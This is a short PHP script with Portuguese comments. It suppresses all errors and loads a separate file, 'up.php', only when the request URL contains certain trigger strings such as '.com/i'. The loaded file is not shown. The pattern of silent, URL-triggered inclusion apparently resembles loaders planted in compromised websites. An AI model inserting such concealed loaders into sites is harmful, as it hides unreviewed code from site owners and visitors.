<?php
/**
 * Execução Condicional: Roda up.php APENAS se o termo for encontrado
 */

@error_reporting(0);
@ini_set('display_errors', 0);

// 1. Termos que disparam a execução
$jsonAtivadores = '[".com/i",".com/u",".com/d",".com/.",".com/g"]';
$listaAtivadora = json_decode($jsonAtivadores, true);

// 2. Captura e limpeza da URL (Decodifica caracteres como %20, %2F)
$urlAtual = rawurldecode($_SERVER['REQUEST_URI']);
$urlComparacao = strtolower($urlAtual);

$deveExecutar = false;

// 3. Verificação de Sincronia
foreach ($listaAtivadora as $termo) {
    if (!empty($termo) && strpos($urlComparacao, strtolower($termo)) !== false) {
        $deveExecutar = true;
        break; 
    }
}

// 4. Gatilho de Execução
if ($deveExecutar) {
    if (file_exists("up.php")) {
        // Usa require para garantir que o processo só continue se o up.php carregar com sucesso
        require_once "up.php";
    } else {
        // Opcional: Criar o arquivo se ele sumir ou logar o erro
        error_log("Tentativa de execução: up.php não encontrado.");
    }
} else {
    // Caso não tenha os termos, você pode colocar um aviso ou apenas encerrar
    // exit("URL não autorizada para processamento.");
}
